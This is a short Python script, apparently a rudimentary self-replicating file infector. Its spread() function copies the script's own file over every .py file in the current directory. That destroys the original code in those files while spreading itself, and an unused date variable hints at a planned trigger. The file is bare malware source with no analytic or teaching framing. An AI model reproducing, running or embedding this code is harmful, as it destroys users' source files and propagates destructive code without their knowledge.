import datetime
import pathlib
import shutil

current_day = datetime.datetime.now().day
runtime_path = pathlib.Path().resolve()

def spread():
    for entry in runtime_path.iterdir():
        if (entry.match("*.py") == True):
            shutil.copy(__file__, entry)